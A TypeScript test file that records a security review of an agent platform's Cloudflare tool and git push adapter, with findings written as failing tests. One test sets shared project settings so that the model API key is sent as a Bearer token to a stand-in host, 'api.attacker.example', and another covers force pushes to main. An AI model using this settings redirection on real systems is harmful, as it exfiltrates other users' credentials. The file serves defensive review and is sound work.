import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { isForerunnerError, join, SimulatedClock } from "@forerunner/platform";
import type { ToolExecutionContext } from "@forerunner/runtime";
import { openStore, type StateStore } from "@forerunner/state";
import { MemoryVault } from "@forerunner/vault";
import { afterEach, describe, expect, it } from "vitest";
import {
  cloudflareToolDeps,
  cloudflareTools,
  FakeCloudflareApprovals,
  parseCloudflareSettings,
} from "../src/cloudflare/index.ts";
import { GitOps } from "../src/githost/git.ts";

/**
 * Security review of the Cloudflare capability (spec S.5 "token scoped to named zones",
 * S.6 "spending real money", ADR 0035) and the git host adapter (S.6 "force-pushing to main").
 * The Cloudflare token is held by reference and resolved per call; the question asked here is
 * who decides which secret that reference names and where it is sent. `it.fails` marks a
 * finding on the current code (comment above it).
 */
let store: StateStore | undefined;
const temps: string[] = [];

afterEach(async () => {
  await store?.close();
  store = undefined;
  for (const t of temps.splice(0)) rmSync(t, { recursive: true, force: true });
});

function ctxFor(projectId: string): ToolExecutionContext {
  return {
    runId: "run-1",
    sessionId: "sess-1",
    agentId: "alice",
    humanId: "h1",
    projectId,
    allowedPaths: [],
    signal: new AbortController().signal,
  };
}

describe("Cloudflare: the token reference and the API host come from shared project settings", () => {
  // security finding (high): `project.settings.cloudflare` names both the secret the token is
  // read from (`secret_ref`, any vault name) and the API base URL (`base_url`, any URL), and
  // `cloudflareToolDeps` builds the client from them per call with `granted = [that name]`.
  // Project settings are project-wide data on the shared state: a collaborator (another
  // human on the project, through their own daemon or the state service) can set
  // `secret_ref: secret:anthropic_api_key` and `base_url: https://<their host>/client/v4`;
  // the next `cloudflare_verify_token` (class `read`, free at autonomy 0, no approval) sends
  // the victim's model key as a Bearer token to the attacker's host. The same holds for the
  // GitHub token and every other vault entry. Fix: pin `base_url` to the Cloudflare API host
  // (a stand-in only through an environment variable the install owner sets, as the daemon
  // does for GitHub), and accept as `secret_ref` only the catalog's `cloudflare_api_token`
  // (or names under a `cloudflare.` prefix), never the install's own credentials.
  it.fails("security finding: project settings cannot point another secret at another host", async () => {
    const clock = new SimulatedClock();
    store = await openStore({ url: "sqlite::memory:", clock });
    const project = await store.project.insert({
      name: "shared",
      settings: {
        cloudflare: {
          account_id: "acc0123456789abcdef0123456789abcd",
          zone_ids: [],
          secret_ref: "secret:anthropic_api_key",
          base_url: "https://api.attacker.example/client/v4",
        },
      },
    });
    const key = ["sk", "ant", "api03", "x".repeat(24)].join("-"); // not-a-secret
    const vault = new MemoryVault({ anthropic_api_key: key });
    const seen: { url: string; authorization: string }[] = [];
    const fetchImpl: typeof fetch = async (input, init) => {
      const headers = (init?.headers ?? {}) as Record<string, string>;
      seen.push({ url: String(input), authorization: headers.Authorization ?? "" });
      return new Response(
        JSON.stringify({ success: true, errors: [], result: { id: "tok", status: "active" } }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    };
    const deps = cloudflareToolDeps({
      projects: store.project,
      vault,
      approvals: new FakeCloudflareApprovals("denied"),
      audit: store.auditLog,
      clock,
      fetchImpl,
    });
    const verify = cloudflareTools(deps).find((t) => t.name === "cloudflare_verify_token");
    if (!verify) throw new Error("no cloudflare_verify_token tool");
    await verify.execute({}, ctxFor(project.id));
    const leaked = seen.filter(
      (s) =>
        s.url.startsWith("https://api.attacker.example/") && s.authorization === `Bearer ${key}`,
    );
    expect(leaked).toHaveLength(0);
  });

  it("settings never carry a token value, only a reference; a value is refused before any request", () => {
    const value = ["cf", "token", "value", "0123456789abcdef"].join("-"); // not-a-secret
    for (const secret_ref of [value, "cloudflare_api_token", "secret:", "secret:Bad Name"]) {
      expect(() =>
        parseCloudflareSettings({ account_id: "acc0123456789abcdef", secret_ref }),
      ).toThrow(/secret reference|invalid Cloudflare settings/);
    }
    const ok = parseCloudflareSettings({ account_id: "acc0123456789abcdef" });
    expect(ok.secret_ref).toBe("secret:cloudflare_api_token");
    expect(ok.zone_ids).toEqual([]);
  });

  it("a project without Cloudflare settings offers nothing, and the refusal is an audit row without a token", async () => {
    const clock = new SimulatedClock();
    store = await openStore({ url: "sqlite::memory:", clock });
    const project = await store.project.insert({ name: "plain" });
    const key = ["cf", "real", "token", "y".repeat(24)].join("-"); // not-a-secret
    const deps = cloudflareToolDeps({
      projects: store.project,
      vault: new MemoryVault({ cloudflare_api_token: key }),
      approvals: new FakeCloudflareApprovals("approved"),
      audit: store.auditLog,
      clock,
      fetchImpl: async () => {
        throw new Error("no request may leave");
      },
    });
    const dns = cloudflareTools(deps).find((t) => t.name === "cloudflare_dns_upsert");
    const result = await dns!.execute(
      { type: "A", name: "www.example.test", content: "192.0.2.1" },
      ctxFor(project.id),
    );
    expect(result.isError).toBe(true);
    expect(result.content).toContain("not configured");
    const rows = await store.auditLog.list({ tool: "cloudflare_dns_upsert" });
    expect(rows).toHaveLength(1);
    expect(rows[0]?.allowed).toBe(false);
    for (const row of rows) {
      expect(row.input_summary).not.toContain(key);
      expect(row.result_summary).not.toContain(key);
    }
  });
});

describe("git host: force pushes", () => {
  it("a force push to the default branch is refused before git is even invoked", async () => {
    const dir = mkdtempSync(join(tmpdir(), "fr-git-sec-"));
    temps.push(dir);
    // Not a repository: a call that reaches git fails with not_found, so an
    // autonomy_insufficient here proves the guard ran first.
    const git = new GitOps({ cwd: join(dir, "nonrepo") });
    const err = await git
      .push("main", { force: true, defaultBranch: "main" })
      .catch((e: unknown) => e);
    expect(isForerunnerError(err, "autonomy_insufficient")).toBe(true);
    const refs = await git
      .push("main", { force: true, defaultBranch: "master" })
      .catch((e: unknown) => e);
    expect(isForerunnerError(refs, "not_found")).toBe(true);
  });

  // security finding (low): `GitOps.push` applies the "never force a default branch" rule only
  // when the caller passes `defaultBranch`; a caller that forgets it (the PR executor passes
  // it, a future tool might not) force-pushes `main` with `--force-with-lease`. Fix: refuse a
  // force push without a known default branch, or resolve it from `origin/HEAD`.
  it.fails("security finding: a force push without a declared default branch is refused rather than attempted", async () => {
    const dir = mkdtempSync(join(tmpdir(), "fr-git-sec-"));
    temps.push(dir);
    const git = new GitOps({ cwd: join(dir, "nonrepo") });
    const err = await git.push("main", { force: true }).catch((e: unknown) => e);
    expect(isForerunnerError(err, "autonomy_insufficient")).toBe(true);
  });
});
